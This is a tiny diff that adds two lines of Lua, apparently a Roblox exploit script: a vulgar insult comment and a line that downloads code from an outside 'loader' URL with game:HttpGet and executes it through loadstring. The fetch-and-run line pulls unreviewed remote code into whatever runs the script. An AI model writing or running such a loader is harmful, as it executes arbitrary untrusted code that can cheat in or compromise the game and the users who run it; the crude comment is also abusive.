@@ -1,0 +1,2 @@
+-- i fack yo mama
+loadstring(game:HttpGet("https://platinstudio.xyz/loader/HSXMain"))()
